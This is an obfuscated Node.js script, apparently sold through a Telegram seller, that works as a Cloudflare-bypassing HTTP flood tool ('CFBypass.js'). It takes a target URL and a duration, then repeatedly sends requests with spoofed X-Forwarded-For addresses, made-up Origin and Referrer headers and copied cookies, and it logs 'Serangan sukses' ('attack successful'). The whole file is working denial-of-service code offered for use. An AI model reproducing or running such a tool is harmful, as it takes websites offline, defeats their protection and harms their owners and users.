/*

     
    👇👇👇 𝙱𝙰𝙲𝙰 𝙸𝙽𝙸 𝙿𝙴𝙽𝚃𝙸𝙽𝙶 !! 👇👇👇

 * Script :  Made By Anggazyy ❤😁
 * Script : Di lindungi dengan ketat !
 * Note : This script not for free, hargai creator.
 * Thanks To ❤ : Saqioo, Hanmood, Anggazyy, Zaenshi 
 * Terimakasih telah berkontribusi di script ini :)
 * Owner utama : https://t.me/anggazyydev
 * Saluran Saya : https://whatsapp.com/channel/0029VakZidSIXnlmikWIgS1z
 * Script Security ( Anti Air Bug )
 
 * Attention : terimakasi telah membeli script devil ini
              semoga kalian betah pakai script ini
              jangan pernah beli ke orang cukup
              beli ke owner langsung (anggazyydev)
 *Thank You...
 

*/

var _0xf5331a=_0x1323;function _0x1323(_0x5602b4,_0x496346){var _0x357fcb=_0x357f();return _0x1323=function(_0x13231d,_0x140cbf){_0x13231d=_0x13231d-0x1ed;var _0x40712a=_0x357fcb[_0x13231d];return _0x40712a;},_0x1323(_0x5602b4,_0x496346);}(function(_0x312cb0,_0x13f3a0){var _0x5b3490=_0x1323,_0x1121e3=_0x312cb0();while(!![]){try{var _0x845a2d=parseInt(_0x5b3490(0x1f9))/0x1*(parseInt(_0x5b3490(0x210))/0x2)+parseInt(_0x5b3490(0x20b))/0x3+parseInt(_0x5b3490(0x1f4))/0x4*(-parseInt(_0x5b3490(0x204))/0x5)+-parseInt(_0x5b3490(0x202))/0x6*(-parseInt(_0x5b3490(0x212))/0x7)+parseInt(_0x5b3490(0x1f7))/0x8*(-parseInt(_0x5b3490(0x1ff))/0x9)+-parseInt(_0x5b3490(0x201))/0xa+-parseInt(_0x5b3490(0x209))/0xb;if(_0x845a2d===_0x13f3a0)break;else _0x1121e3['push'](_0x1121e3['shift']());}catch(_0x25f35a){_0x1121e3['push'](_0x1121e3['shift']());}}}(_0x357f,0x94617));var cloudscraper=require('cloudscraper'),request=require('request'),randomstring=require(_0xf5331a(0x20d)),args=process[_0xf5331a(0x20a)][_0xf5331a(0x203)](0x2);randomByte=function(){var _0x27c5cc=_0xf5331a;return Math[_0x27c5cc(0x207)](Math[_0x27c5cc(0x1f3)]()*0x100);};process[_0xf5331a(0x20a)][_0xf5331a(0x1fb)]<=0x2&&(console[_0xf5331a(0x1ee)](_0xf5331a(0x200)),console[_0xf5331a(0x1ee)](_0xf5331a(0x1ed)),process[_0xf5331a(0x205)](-0x1));var url=process[_0xf5331a(0x20a)][0x2],time=process[_0xf5331a(0x20a)][0x3];setInterval;var int=setInterval(()=>{var _0x2d448f=_0xf5331a,_0x2f6028=_0x2d448f(0x1f5),_0x5ea1ed='proxy.txt';cloudscraper[_0x2d448f(0x20f)](url,function(_0x3e3991,_0xfab229,_0x806e9b){var _0x36aed3=_0x2d448f;if(_0x3e3991)console['log'](_0x36aed3(0x1fc));else{var _0x362cbe=JSON[_0x36aed3(0x1fe)](JSON[_0x36aed3(0x211)](_0xfab229));_0x2f6028=_0x362cbe[_0x36aed3(0x1ef)][_0x36aed3(0x1f8)][_0x36aed3(0x213)],_0x5ea1ed=_0x362cbe[_0x36aed3(0x1ef)][_0x36aed3(0x1f8)][_0x36aed3(0x1f6)];}var _0x28bff1=randomstring[_0x36aed3(0x1fa)]({'length':0xa,'charset':'abcdefghijklmnopqstuvwxyz0123456789'}),_0xf5a320=randomByte()+'.'+randomByte()+'.'+randomByte()+'.'+randomByte();const _0x467c6e={'url':url,'headers':{'User-Agent':_0x5ea1ed,'Accept':_0x36aed3(0x20c),'Upgrade-Insecure-Requests':_0x36aed3(0x1fd),'cookie':_0x2f6028,'Origin':_0x36aed3(0x1f1)+_0x28bff1+_0x36aed3(0x206),'Referrer':_0x36aed3(0x1f0)+_0x28bff1,'X-Forwarded-For':_0xf5a320}};function _0x3b6e4a(_0x118d16,_0x45e614,_0x1190b9){}request(_0x467c6e);});});function _0x357f(){var _0x31a2f1=['Usage:\x20node\x20CFBypass.js\x20<url>\x20<time>','5567340YYMuBp','294HHiomD','slice','1185jmanuf','exit','.com','round','Serangan\x20sukses','1819763pYvKpt','argv','3069498ffzdOP','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','randomstring','uncaughtException','get','2uFLVqJ','stringify','76321AfMioH','cookie','Usage:\x20node\x20CFBypass.js\x20<http://example.com>\x20<60>','log','request','http://google.com/','http://','unhandledRejection','random','2468WoBYZN','ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890','User-Agent','376oBylQL','headers','93073MSInbj','generate','length','Error\x20occurred','2000','parse','33381LuFxEr'];_0x357f=function(){return _0x31a2f1;};return _0x357f();}setTimeout(()=>clearInterval(int),time*0x186a0),process['on'](_0xf5331a(0x20e),function(_0x23beff){}),process['on'](_0xf5331a(0x1f2),function(_0x1dc781){}),console[_0xf5331a(0x1ee)](_0xf5331a(0x208));